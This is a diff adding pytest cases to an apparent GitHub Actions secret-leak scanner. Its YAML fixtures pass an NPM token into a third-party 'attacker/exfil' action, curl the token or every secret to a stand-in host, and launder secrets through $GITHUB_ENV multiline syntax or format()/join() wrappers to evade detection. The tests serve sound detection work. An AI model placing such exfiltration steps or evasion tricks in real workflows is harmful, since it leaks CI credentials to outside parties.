@@ -251,3 +251,189 @@ jobs:
     hits = scan_target(tmp_path, [], [])
     untrusted = [h for h in hits if h.sink_kind == "untrusted_action"]
     assert untrusted and untrusted[0].severity == "high"
+
+
+# ---------------------------------------------------------------------------
+# Expression-function wraps — format()/join() are first-class GHA
+# expression syntax; anchoring ``secrets.`` to the ``${{`` opener
+# missed every wrapped reference at BOTH high-severity sinks.
+# ---------------------------------------------------------------------------
+
+_FMT_WITH_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ format('{0}', secrets.NPM_TOKEN) }}
+"""
+
+_JOIN_WITH_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ join(fromJSON(format('["{0}"]', secrets.NPM_TOKEN)), '') }}
+"""
+
+_FMT_RUN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "t=${{ format('{0}', secrets.NPM_TOKEN) }}" https://collab.example
+"""
+
+_TOJSON_RUN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "t=${{ format('{0}', toJSON(secrets)) }}" https://collab.example
+"""
+
+_FMT_BENIGN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ format('{0}', github.run_id) }}
+      - run: echo "see docs about secrets.NPM_TOKEN spelling"
+"""
+
+
+def test_format_wrapped_secret_into_untrusted_action_fires(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "fmt-with.yml", _FMT_WITH_WF)
+    hits = scan_target(tmp_path)
+    # untrusted_action hits carry the tainted INPUT names.
+    assert any(
+        h.sink_kind == "untrusted_action" and "token" in h.secret_names
+        for h in hits
+    )
+
+
+def test_join_wrapped_secret_into_untrusted_action_fires(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "join-with.yml", _JOIN_WITH_WF)
+    hits = scan_target(tmp_path)
+    assert any(
+        h.sink_kind == "untrusted_action" and "token" in h.secret_names
+        for h in hits
+    )
+
+
+def test_format_wrapped_secret_in_run_block_fires(tmp_path: Path) -> None:
+    _write_wf(tmp_path, "fmt-run.yml", _FMT_RUN_WF)
+    hits = scan_target(tmp_path)
+    assert any(
+        h.sink_kind == "run_block" and "NPM_TOKEN" in h.secret_names
+        for h in hits
+    )
+
+
+def test_tojson_wrapped_in_run_block_fires(tmp_path: Path) -> None:
+    _write_wf(tmp_path, "tojson-run.yml", _TOJSON_RUN_WF)
+    hits = scan_target(tmp_path)
+    assert any(h.sink_kind == "run_block" for h in hits)
+
+
+def test_expression_scoped_grammar_has_no_plain_text_false_positive(
+    tmp_path: Path,
+) -> None:
+    """``secrets.`` spelled OUTSIDE an expression (prose, comments)
+    and expressions with no secret reference stay silent — the
+    unanchored grammar is scoped to ``${{ … }}`` interiors."""
+    _write_wf(tmp_path, "benign.yml", _FMT_BENIGN_WF)
+    hits = scan_target(tmp_path)
+    assert not any(
+        h.sink_kind in ("untrusted_action", "run_block") for h in hits
+    )
+
+
+# ---------------------------------------------------------------------------
+# GitHub's documented multiline env-file syntax — KEY<<DELIM framing
+# ---------------------------------------------------------------------------
+
+_ENVFILE_GROUPED_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          { echo "TOK<<EOF"; echo "${{ secrets.NPM_TOKEN }}"; echo "EOF"; } >> $GITHUB_ENV
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ env.TOK }}
+"""
+
+_ENVFILE_PER_LINE_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "TOK<<EOF" >> $GITHUB_ENV
+          echo "${{ secrets.NPM_TOKEN }}" >> $GITHUB_ENV
+          echo "EOF" >> $GITHUB_ENV
+      - uses: attacker/exfil@v1
+        with:
+          token: ${{ env.TOK }}
+"""
+
+_ENVFILE_BENIGN_WF = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          { echo "NOTE<<EOF"; echo "release notes"; echo "EOF"; } >> $GITHUB_ENV
+      - uses: attacker/exfil@v1
+        with:
+          note: ${{ env.NOTE }}
+"""
+
+
+def test_envfile_multiline_grouped_write_taints_downstream_sink(
+    tmp_path: Path,
+) -> None:
+    """``KEY<<DELIM`` written to ``$GITHUB_ENV`` in one grouped
+    block is GitHub's OWN documented multiline env-file syntax —
+    the downstream untrusted-action sink on ``env.KEY`` must fire,
+    not just the write step's run_block."""
+    _write_wf(tmp_path, "envfile-group.yml", _ENVFILE_GROUPED_WF)
+    hits = scan_target(tmp_path)
+    assert any(h.sink_kind == "untrusted_action" for h in hits)
+
+
+def test_envfile_multiline_per_line_write_taints_downstream_sink(
+    tmp_path: Path,
+) -> None:
+    """Same framing spelled as three separate appends (the shape the
+    GitHub docs show)."""
+    _write_wf(tmp_path, "envfile-lines.yml", _ENVFILE_PER_LINE_WF)
+    hits = scan_target(tmp_path)
+    assert any(h.sink_kind == "untrusted_action" for h in hits)
+
+
+def test_envfile_multiline_without_secret_does_not_taint(
+    tmp_path: Path,
+) -> None:
+    _write_wf(tmp_path, "envfile-benign.yml", _ENVFILE_BENIGN_WF)
+    hits = scan_target(tmp_path)
+    assert not any(h.sink_kind == "untrusted_action" for h in hits)
